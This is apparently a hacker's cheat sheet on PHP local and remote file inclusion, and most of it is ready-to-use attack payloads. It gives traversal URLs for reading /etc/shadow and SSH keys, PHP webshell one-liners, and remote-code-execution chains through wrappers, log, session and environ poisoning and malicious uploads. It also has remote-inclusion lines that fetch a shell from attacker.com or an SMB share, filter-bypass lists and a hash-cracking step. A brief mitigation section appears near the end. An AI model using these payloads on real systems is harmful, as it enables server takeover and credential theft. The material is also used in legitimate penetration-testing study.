## 📖 Overview (Theory)

**File Inclusion** vulnerabilities let attackers include files on a web server — either **locally** (LFI) or **remotely** (RFI). When user input (like `?page=`, `?file=`, `?lang=`) isn't validated, attackers can:

- **Read sensitive files** (`/etc/passwd`, `config.php`, etc.)
- **Execute code** (via wrappers, log poisoning, uploads, etc.)
- **Escalate to RCE** (Remote Code Execution)

### **Types:**

|Type|What It Does|Example|
|---|---|---|
|**LFI** (Local File Inclusion)|Include/execute local files on the server|`?page=../../etc/passwd`|
|**RFI** (Remote File Inclusion)|Include/execute remote files from attacker's server|`?page=http://evil.com/shell.txt`|
|**Directory Traversal**|Read files outside webroot (subset of LFI)|`?file=../../../../etc/shadow`|

### **Key Differences:**

|Parameter|Directory Traversal|LFI|RFI|
|---|---|---|---|
|**Reads files?**|✅ Yes|✅ Yes|✅ Yes|
|**Executes code?**|❌ No|✅ Yes|✅ Yes|
|**Needs `allow_url_include=On`?**|❌ No|❌ No|✅ Yes|

---

## 🎯 Where to Find Vulnerabilities

Look for **parameters that load files**:

```
✅ ?page=
✅ ?file=
✅ ?lang=
✅ ?include=
✅ ?template=
✅ ?path=
✅ ?module=
✅ ?doc=
✅ Cookies (e.g., Cookie: usid=../../../etc/passwd)
```

### **Quick Test Steps:**

1. **Identify input vectors** → Find params that accept filenames
2. **Test basic traversal** → Try `../../../etc/passwd`
3. **Check response** → Same output = likely vulnerable
4. **Try bypasses** → Encodings, null bytes, filters
5. **Escalate to RCE** → Use wrappers, logs, uploads

---

## 💣 Exploitation Methods

### **1️⃣ Basic LFI (Linux)**

```bash
# Basic traversal
http://target.com/index.php?page=../../../etc/passwd
http://target.com/index.php?page=../../../../../../../../../../../../etc/shadow

# From existing folder
http://target.com/index.php?page=scripts/../../../../../etc/passwd

# Absolute path
http://target.com/index.php?page=/etc/passwd

# Check if LFI exists
/var/run/secrets/kubernetes.io/serviceaccount
```

### **2️⃣ Basic LFI (Windows)**

```bash
# Windows paths
http://target.com/?page=C:\boot.ini
http://target.com/?page=C:\windows\system32\drivers\etc\hosts
http://target.com/?page=%SYSTEMROOT%\win.ini
http://target.com/?page=file:///C:/boot.ini

# Alternative separators
http://target.com/?page=..\..\..\..\windows\system32\drivers\etc\hosts
```

### **3️⃣ Basic RFI**

```bash
# Host malicious PHP file
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 80

# Execute remotely
http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=id
```

---

## 🚀 Advanced Techniques

### **PHP Wrappers (LFI → RCE)**

#### **🔹 php://filter (Read Source Code)**

```bash
# Base64 encode source
http://target.com/?page=php://filter/convert.base64-encode/resource=index.php

# Decode output
curl 'http://target.com/?page=php://filter/convert.base64-encode/resource=config.php' | base64 -d

# With compression (for large files)
http://target.com/?page=php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php

# ROT13 encoding
http://target.com/?page=php://filter/read=string.rot13/resource=config.php
```

#### **🔹 php://input (Execute POST Data)**

```bash
# POST payload
curl -X POST --data "<?php system('id'); ?>" "http://target.com/?page=php://input"

# With kadimus
./kadimus -u "http://target.com/?page=php://input" -C '<?php system("id"); ?>' -T input
```

#### **🔹 data:// (Inline Code Execution)**

```bash
# Base64 payload: <?php system($_GET['cmd']);?>
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

# XSS bonus (bypasses Chrome Auditor)
http://target.com/?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

#### **🔹 expect:// (Direct Command)**

```bash
http://target.com/?page=expect://id
http://target.com/?page=expect://whoami
```

#### **🔹 zip:// (Upload + Execute)**

```bash
# Create payload
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
zip shell.zip shell.php
mv shell.zip shell.jpg

# Trigger
http://target.com/?page=zip://shell.jpg%23shell.php&cmd=id
```

#### **🔹 phar:// (PHP Archive)**

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

```bash
# Compile
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# Execute
http://target.com/?page=phar://./shell.jpg%2Fshell.txt&cmd=id
```

---

### **Log Poisoning (LFI → RCE)**

#### **🔹 SSH Logs (`/var/log/auth.log`)**

```bash
# Inject payload via SSH
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Trigger
http://target.com/?page=../../../var/log/auth.log&cmd=id
```

#### **🔹 Apache Logs (`/var/log/apache2/access.log`)**

```bash
# Inject via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Trigger
http://target.com/?page=../../../var/log/apache2/access.log&cmd=id
```

**Common log paths:**

```
Linux Apache: /var/log/apache2/access.log
Linux Apache: /var/log/apache2/error.log
RHEL/CentOS: /var/log/httpd/access_log
Windows XAMPP: C:\xampp\apache\logs\access.log
Nginx: /var/log/nginx/access.log
```

#### **🔹 FTP Logs (`/var/log/vsftpd.log`)**

```bash
# Inject payload
ftp target.com
> <?php system($_GET['cmd']); ?>

# Trigger
http://target.com/?page=/var/log/vsftpd.log&cmd=id
```

#### **🔹 Mail Logs (`/var/log/mail`)**

```bash
# Send malicious email
telnet target.com 25
MAIL FROM:<test@test.com>
RCPT TO:<?php system($_GET['cmd']); ?>

# Trigger
http://target.com/?page=/var/log/mail&cmd=id
```

---

### **PHP Session Poisoning**

```bash
# Check session location
/var/lib/php/sessions/sess_<PHPSESSID>
/var/lib/php5/sess_<PHPSESSID>
C:\Windows\Temp\

# Inject payload in parameter
curl -b "PHPSESSID=abc123" "http://target.com/?user=<?php system(\$_GET['cmd']); ?>"

# Trigger
http://target.com/?page=/var/lib/php/sessions/sess_abc123&cmd=id
```

---

### **File Upload → LFI → RCE**

```bash
# Create malicious image
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Upload file, then include it
http://target.com/?page=/uploads/shell.gif&cmd=id
```

---

### **/proc/self/environ Poisoning**

```bash
# Inject in User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Trigger
http://target.com/?page=../../../proc/self/environ&cmd=id
```

---

### **Race Condition (Temp File Upload)**

```python
import requests

url = "http://target.com/?page=php://filter/string.strip_tags/resource=/etc/passwd"
files = {'file': open('shell.php', 'rb')}

# Upload + trigger segfault
for _ in range(1000):
    requests.post(url, files=files)

# Bruteforce /tmp/php<random>
# (See full script in docs)
```

---

## 🛡️ Bypass Techniques

### **1️⃣ Null Byte Injection** (PHP < 5.3.4)

```bash
http://target.com/?page=../../../etc/passwd%00
http://target.com/?page=http://evil.com/shell.txt%00
```

### **2️⃣ Double Encoding**

```bash
http://target.com/?page=%252e%252e%252fetc%252fpasswd
http://target.com/?page=http%253A%252F%252Fevil.com%252Fshell.php
```

### **3️⃣ UTF-8 Encoding**

```bash
http://target.com/?page=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### **4️⃣ Path Truncation** (PHP < 5.3)

```bash
# Add 4096+ chars to cut filename
http://target.com/?page=../../../etc/passwd............[ADD 4096 MORE]
http://target.com/?page=../../../etc/passwd/./././././.[ADD MORE]
```

### **5️⃣ Filter Bypasses**

```bash
# Double slashes
http://target.com/?page=....//....//etc/passwd

# Mixed slashes
http://target.com/?page=..///////..////..//////etc/passwd

# Backslash encoding
http://target.com/?page=/%5C../%5C../%5C../etc/passwd

# Dot encoding
http://target.com/?page=/.%2e/.%2e/.%2e/etc/passwd

# Double encoding special
http://target.com/?page=/%%32%65%%32%65/etc/passwd
```

### **6️⃣ 403 Bypasses**

```bash
/admin..;/
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#
//secret//
/./secret/..
/admin%20/
/%20admin%20/
```

### **7️⃣ Bypass `allow_url_include` (Windows SMB)**

```bash
# Start SMB server
impacket-smbserver share $(pwd) -smb2support

# Include via UNC path
http://target.com/?page=\\attacker.com\share\shell.php
```

---

## 🔥 Modern RCE Payloads (Top 10)

### **1. PHP Filter Chain (No File Needed!)**

```bash
# Generate payload
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;;?>'

# Execute
http://target.com/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|...[LONG_CHAIN]|convert.base64-decode/resource=php://temp&0=id
```

### **2. PHP Input Stream**

```bash
curl -X POST --data "<?php system('id'); ?>" "http://target.com/?page=php://input"
```

### **3. Data Wrapper**

```bash
http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg==&0=id
```

### **4. Expect Wrapper**

```bash
http://target.com/?page=expect://id
```

### **5. Zip Wrapper**

```bash
# Create shell.zip with shell.php
http://target.com/?page=zip://uploads/shell.jpg%23shell.php&cmd=id
```

### **6. Log Poisoning**

```bash
# Via User-Agent
curl -A "<?php system(\$_GET[0]); ?>" http://target.com/
http://target.com/?page=/var/log/apache2/access.log&0=id
```

### **7. Session Poisoning**

```bash
# Poison session
curl -b "PHPSESSID=x" "http://target.com/?lang=<?php system(\$_GET[0]); ?>"
# Trigger
http://target.com/?page=/var/lib/php/sessions/sess_x&0=id
```

### **8. /proc/self/environ**

```bash
curl -A "<?php system(\$_GET[0]); ?>" http://target.com/
http://target.com/?page=/proc/self/environ&0=id
```

### **9. PHP Session Upload Progress**

```bash
curl -F "PHP_SESSION_UPLOAD_PROGRESS=<?php system('id'); ?>" -F "file=@shell.txt" -b "PHPSESSID=x" http://target.com/
http://target.com/?page=/var/lib/php/sessions/sess_x
```

### **10. Nginx Temp Files (Race Condition)**

```bash
# Requires multiple requests + bruteforce /var/lib/nginx/body/*
# (See full exploit in docs)
```

---

## 🎖️ Higher Impact (Privilege Escalation)

### **Check User Privileges**

#### **Windows:**

```bash
# If you can read these → You're admin
c:/documents and settings/administrator/ntuser.ini
c:/users/administrator/desktop/desktop.ini

# If you can read these → LocalSystem
c:/system volume information/wpsettings.dat
C:/Windows/CSC/v2.0.6/pq
C:/$Recycle.Bin/S-1-5-18/desktop.ini
```

#### **Linux:**

```bash
# Read shadow file
http://target.com/?page=../../../etc/shadow

# Crack hashes
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

---

## 🛠️ Tools

```bash
# Kadimus (LFI scanner + exploitation)
./kadimus -u "http://target.com/?page=" -A "PENTEST"

# DotDotPwn (fuzzer)
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd

# PHP Filter Chain Generator
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`;;?>'

# Wrapwrap (add suffixes to filter output)
python3 wrapwrap.py '<?php system("id"); ?>' --suffix '.json'
```

---

## 🔒 Interesting Files to Target

### **Linux:**

```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/version
/var/log/apache2/access.log
/var/log/auth.log
/home/<user>/.ssh/id_rsa
/root/.bash_history
```

### **Windows:**

```
C:\boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\inetpub\logs\LogFiles\W3SVC1\
C:\xampp\apache\conf\httpd.conf
C:\Program Files\Apache\conf\httpd.conf
```

---

## 🚨 Detection & Mitigation

### **How to Detect:**

1. **Monitor logs** → Look for `../`, `..%2F`, `php://`, `data://`
2. **WAF rules** → Block traversal sequences
3. **File access monitoring** → Alert on `/etc/passwd`, `/var/log/*` reads

### **How to Fix:**

✅ **Whitelist allowed files** (never blacklist)  
✅ **Use `basename()` to strip paths**  
✅ **Disable `allow_url_include` in php.ini**  
✅ **Sanitize ALL user input**  
✅ **Use `realpath()` to resolve paths safely**  
✅ **Restrict file permissions** (least privilege)  
✅ **Chroot/containerize** web apps

---

## 🎯 Quick Win Checklist

- [ ] Test `?page=../../../etc/passwd`
- [ ] Try null byte (`%00`)
- [ ] Try double encoding (`%252e`)
- [ ] Test wrappers (`php://filter`, `php://input`, `data://`)
- [ ] Check logs (`/var/log/apache2/access.log`)
- [ ] Try session poisoning (`/var/lib/php/sessions/sess_*`)
- [ ] Upload file + include it
- [ ] Test RFI (`http://attacker.com/shell.txt`)
- [ ] Escalate to RCE with filter chains

---

**💀 Happy Hunting, Beta is out! 💀**